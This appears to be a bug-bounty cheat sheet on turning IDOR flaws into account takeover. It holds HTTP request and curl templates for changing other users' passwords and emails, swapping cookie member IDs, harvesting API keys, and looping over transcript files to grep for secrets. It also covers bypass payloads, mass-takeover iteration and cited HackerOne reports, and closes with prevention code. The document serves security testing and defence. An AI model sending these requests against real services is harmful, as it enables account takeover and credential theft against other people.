---
tags:
  - critical
---

# IDOR → Account Takeover

Turn Insecure Direct Object References into complete account compromise.

## TL;DR

IDOR (Insecure Direct Object Reference) occurs when apps use user-supplied input to access objects without authorization checks. When targeting account-related endpoints (password reset, email change, profile updates), IDOR escalates directly to ATO. Often the simplest path to critical impact.

## Overview

```
IDOR → Password Change      → Direct ATO
     → Email Change         → Password Reset → ATO
     → Profile Modification → Password Field Injection → ATO
     → Reset Token Access   → Token Reuse → ATO
     → Session Token Leak   → Session Hijack → ATO
     → API Key Exposure     → Full Access → ATO
```

---

## Chain 1: Direct Password Change IDOR

**When:** Password change endpoint accepts user ID without authorization check

```http
# Normal request (your account)
POST /api/user/password HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=abc123

{
  "user_id": 1337,
  "new_password": "newpass123"
}

# IDOR attack (victim's account)
POST /api/user/password HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=abc123

{
  "user_id": 1338,
  "new_password": "hacked123"
}
```

**cURL:**
```bash
curl -X POST 'https://target.com/api/user/password' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=YOUR_SESSION' \
  -d '{"user_id":VICTIM_ID,"new_password":"hacked123"}'
```

**Attack:** Change `user_id` → Set victim's password → Login as victim

---

## Chain 2: Email Change → Password Reset

**When:** Email update doesn't validate ownership

```http
# Step 1: Change victim's email
POST /api/user/update-email HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "id": 1338,
  "email": "attacker@evil.com"
}

# Step 2: Request password reset
POST /api/auth/forgot-password HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "email": "attacker@evil.com"
}

# Step 3: Reset link arrives at attacker's email
# Step 4: Full ATO
```

**Real-world pattern (from Atavist/Automattic):**
```http
POST /cms/reader/account HTTP/1.1
Host: magazine.atavist.com
Content-Type: application/json

{
  "id": 12345,
  "email": "attacker@evil.com",
  "name": "Victim User"
}
```

---

## Chain 3: Profile Update + Password Field Injection

**When:** Profile endpoint accepts additional fields not shown in UI

```http
# Normal profile update
POST /api/user/profile HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "userId": 1337,
  "name": "John Doe",
  "phone": "555-1234"
}

# Inject password field with IDOR
POST /api/user/profile HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "userId": 1338,
  "name": "Victim Name",
  "phone": "555-1234",
  "password": "hacked123"
}
```

**Discovery:** Capture profile update → Add `password`, `newPassword`, `pass` fields → Test with victim's ID

---

## Chain 4: Password Reset Token IDOR

**When:** Reset tokens are tied to predictable user IDs

```http
# Normal reset request
GET /api/reset-password?token=abc123&user_id=1337 HTTP/1.1
Host: target.com

# IDOR: Use your valid token with victim's ID
GET /api/reset-password?token=abc123&user_id=1338 HTTP/1.1
Host: target.com
```

**Alternative pattern:**
```http
# Token in URL path
POST /api/password-reset/USER_ID/TOKEN HTTP/1.1
Host: target.com

{
  "new_password": "hacked123"
}
```

---

## Chain 5: Cookie-Based IDOR (MemberID Pattern)

**When:** Authorization stored in client-side cookie parameters

```http
# Normal request with cookie
GET /dashboard HTTP/1.1
Host: target.com
Cookie: SALogin=memberID%3D357920%26memberName%3DJohn%26memberType%3D1

# IDOR: Change memberID in cookie
GET /dashboard HTTP/1.1
Host: target.com
Cookie: SALogin=memberID%3D357922

# Password change via memberID
POST /changePassword HTTP/1.1
Host: target.com
Cookie: SALogin=memberID%3D357922

newPass=hacked123&confirmPass=hacked123
```

**Mass ATO:** Iterate through memberIDs → Reset all passwords

---

## Chain 6: Static File IDOR → Credential Leak

**When:** Sensitive files use predictable names

```http
# Chat transcripts
GET /static/transcripts/12144.txt HTTP/1.1
Host: target.com

# Iterate to find credentials
for i in {12140..12200}; do
  curl -s "https://target.com/static/transcripts/$i.txt" | grep -i "password\|token\|key"
done

# Export files
GET /exports/user_1337_data.json HTTP/1.1
# → Try: /exports/user_1338_data.json
```

---

## Chain 7: API Key/Token Exposure IDOR

**When:** User API keys accessible via ID parameter

```http
# Your API keys
GET /api/user/1337/api-keys HTTP/1.1
Host: target.com
Authorization: Bearer YOUR_TOKEN

# Victim's API keys
GET /api/user/1338/api-keys HTTP/1.1
Host: target.com
Authorization: Bearer YOUR_TOKEN

# Response:
{
  "api_key": "sk-live-xxxxxxxxxxxx",
  "created_at": "2024-01-15"
}
```

**Attack:** Steal API key → Full API access → ATO via API

---

## Chain 8: Second-Order IDOR

**When:** User ID stored and used later without validation

```http
# Step 1: Create export schedule with victim's ID
POST /api/exports/schedule HTTP/1.1
Host: target.com

{
  "user_id": 1338,
  "format": "csv",
  "schedule": "daily"
}

# Step 2: Export job runs with victim's data
# Step 3: Download victim's export
GET /api/exports/download/EXPORT_ID HTTP/1.1
```

---

## Advanced IDOR Bypass Techniques

### 1. Parameter Pollution
```http
# Try multiple IDs
POST /api/user/update HTTP/1.1

user_id=1337&user_id=1338
# OR
{"user_id": "1337", "userId": "1338"}
```

### 2. Array Injection
```json
{
  "user_id": [1337, 1338],
  "password": "hacked"
}
```

### 3. Type Juggling
```json
// Try different types
{"user_id": 1338}
{"user_id": "1338"}
{"user_id": "1338.0"}
{"user_id": "001338"}
{"user_id": true}
```

### 4. Wildcard/Special Characters
```http
GET /api/user/*/profile HTTP/1.1
GET /api/user/%2a/profile HTTP/1.1
GET /api/user/-1/profile HTTP/1.1
```

### 5. HTTP Method Switching
```http
# GET blocked? Try POST
# POST blocked? Try PUT, PATCH, DELETE

PUT /api/user/1338/password HTTP/1.1
Content-Type: application/json

{"password": "hacked123"}
```

### 6. API Version Downgrade
```http
# v2 patched? Try v1
GET /api/v1/user/1338/profile HTTP/1.1
GET /api/v2/user/1338/profile HTTP/1.1  # Returns 403
```

### 7. Content-Type Manipulation
```http
# JSON blocked? Try form data
POST /api/user/update HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user_id=1338&password=hacked

# Or XML
Content-Type: application/xml

<user><id>1338</id><password>hacked</password></user>
```

### 8. "me"/"current" Keyword Swap
```http
# /api/users/me works
# Try replacing with numeric ID
GET /api/users/1338/profile HTTP/1.1
```

---

## Finding UUID When "Required"

UUIDs seem unexploitable? Look for leaks:

| Location | Example |
|----------|---------|
| Public profiles | `<img src="/avatars/550e8400-e29b-41d4-a716-446655440000.jpg">` |
| Referral links | `?ref=550e8400-e29b-41d4-a716-446655440000` |
| Sharing URLs | `/share/550e8400-e29b-41d4-a716-446655440000` |
| Email unsubscribe | `?user=550e8400-e29b-41d4-a716-446655440000` |
| API responses | Other endpoints may leak UUIDs |
| Error messages | Debug info sometimes includes IDs |
| Wayback Machine | Historical snapshots |
| Mobile app traffic | Often more verbose |

**UUID Still Valid IDOR:**
- Create 2 accounts, swap UUIDs
- High complexity ≠ no vulnerability
- Many programs accept UUID-based IDOR with reduced severity

---

## Real Bug Bounty Examples

### 1. DoD IDOR → ATO (HackerOne #969223)
```
Discovery: User ID parameter in account management
Impact: Full account takeover of any military personnel
Payout: Classified (DoD program)
```

### 2. Mail.ru Password Reset IDOR (HackerOne #843160)
```
Vulnerability: IDOR in password recovery procedure
Impact: Arbitrary cups.mail.ru account takeover
Chain: Reset request → Change user parameter → Receive reset email
```

### 3. Automattic/Atavist Email IDOR (HackerOne #950881)
```http
POST /cms/reader/account
{"id": VICTIM_ID, "email": "attacker@evil.com"}

Impact: Change any user's email → Reset password → ATO
```

### 4. MTN Group IDOR (HackerOne #1272478)
```
Target: mtnmobad.mtnbusiness.com.ng
Attack: Create 2 accounts → Swap user IDs → Full ATO
```

### 5. Travel Agency Mass ATO (Bug Bounty Write-up)
```http
# Cookie-based memberID IDOR
Cookie: SALogin=memberID%3D357922

# Mass password reset via Burp Intruder
POST /changePassword
memberID=§357920§&newPass=hacked123

Result: Iterate 1-7000 → Mass account takeover
```

---

## Common Vulnerable Endpoints

```
# User Management
/api/user/{id}
/api/user/{id}/profile
/api/user/{id}/settings
/api/users/{id}/edit

# Authentication
/api/user/{id}/password
/api/user/{id}/change-password
/api/password-reset/{id}
/api/user/{id}/email

# Sensitive Data
/api/user/{id}/api-keys
/api/user/{id}/tokens
/api/user/{id}/sessions
/api/user/{id}/export

# Files
/static/users/{id}/data.json
/exports/user_{id}_backup.zip
/transcripts/{id}.txt
```

---

## Exploitation Workflow

```
1. Map all endpoints using user IDs
   └─ Proxy traffic, note ID parameters

2. Create 2 test accounts
   └─ Account A (attacker), Account B (victim)

3. Test horizontal access
   └─ Use A's session to access B's data/actions

4. Identify ATO-relevant endpoints
   └─ Password change, email change, token access

5. Chain for maximum impact
   └─ IDOR + email change → password reset → ATO

6. Document mass exploitation potential
   └─ Can iterate through all user IDs?
```

---

## Prevention

### Authorization Checks
```python
# BAD: No ownership check
@app.route('/api/user/<user_id>/password', methods=['POST'])
def change_password(user_id):
    new_password = request.json['password']
    User.query.get(user_id).set_password(new_password)

# GOOD: Verify ownership
@app.route('/api/user/<user_id>/password', methods=['POST'])
@login_required
def change_password(user_id):
    if current_user.id != int(user_id):
        abort(403)
    # ... proceed with password change
```

### Indirect References
```python
# BAD: Direct database ID
/api/user/1337/data

# GOOD: Session-bound reference
/api/me/data  # Always uses authenticated user's ID
```

### UUID with Proper AuthZ
```python
# UUID alone is NOT security
# Still need authorization check
def get_user_data(uuid):
    user = User.query.filter_by(uuid=uuid).first()
    if user.id != current_user.id:
        abort(403)  # Authorization check required!
```

### Server-Side ID Resolution
```python
# Don't trust client-provided IDs for sensitive operations
@app.route('/api/change-password', methods=['POST'])
@login_required
def change_password():
    # Use session user ID, ignore any client-provided ID
    current_user.set_password(request.json['new_password'])
```

---

## Impact Template

```
This IDOR vulnerability chains to complete Account Takeover:

1. IDOR in [endpoint] allows accessing/modifying [resource] for any user
2. Attacker can [change password / change email / steal tokens]
3. Results in full account compromise of any user
4. Mass exploitation possible by iterating through user IDs

Severity: Critical
CVSS: 9.1+ (Network/Low/None/Changed/High/High)
```

---

## Quick Reference

| IDOR Type | ATO Chain |
|-----------|-----------|
| Password endpoint | Direct password change → Login |
| Email endpoint | Change email → Password reset → Login |
| Profile endpoint | Inject password field → Login |
| Reset token | Steal/reuse token → Set password |
| API keys | Steal keys → API access → ATO |
| Session tokens | Steal token → Session hijack |
| Cookie params | Modify user ID → Access account |

---

*Related: [XSS to ATO](xss-to-ato.md) | [OAuth to ATO](oauth-to-ato.md)*
